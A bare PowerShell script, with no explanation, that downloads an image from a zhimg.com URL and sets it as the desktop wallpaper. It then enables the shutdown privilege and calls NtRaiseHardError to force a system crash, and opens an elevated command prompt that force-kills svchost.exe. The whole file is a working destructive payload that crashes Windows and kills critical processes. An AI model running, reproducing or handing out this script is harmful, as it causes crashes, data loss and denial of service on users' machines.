$url = "https://pic3.zhimg.com/v2-f7c45a855f5881818fe36e8c3ab5645e_r.jpg"
$path = "$env:TEMP\v2-f7c45a855f5881818fe36e8c3ab5645e_r.jpg"
Invoke-WebRequest -Uri $url -OutFile $path
Add-Type @"
using System;
using System.Runtime.InteropServices;
public class Wallpaper {
    [DllImport("user32.dll", SetLastError = true)]
    public static extern bool SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);
}
"@
[Wallpaper]::SystemParametersInfo(20, 0, $path, 0x01 -bor 0x02)
Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;

public class Native {
    [DllImport("ntdll.dll")]
    public static extern uint RtlAdjustPrivilege(
        int Privilege, bool Enable, bool CurrentThread, out bool OldValue);

    [DllImport("ntdll.dll")]
    public static extern uint NtRaiseHardError(
        int ErrorStatus, uint NumberOfParameters, uint UnicodeStringParameterMask,
        IntPtr Parameters, uint ValidResponseOption, out uint Response);
}
"@

$old = $false
[Native]::RtlAdjustPrivilege(19, $true, $false, [ref]$old) | Out-Null

$response = 0
[Native]::NtRaiseHardError(-1073741783, 0, 0, [IntPtr]::Zero, 6, [ref]$response)
Start-Process "cmd.exe" -Verb RunAs -ArgumentList '/k taskkill /im svchost.exe /f & pause'
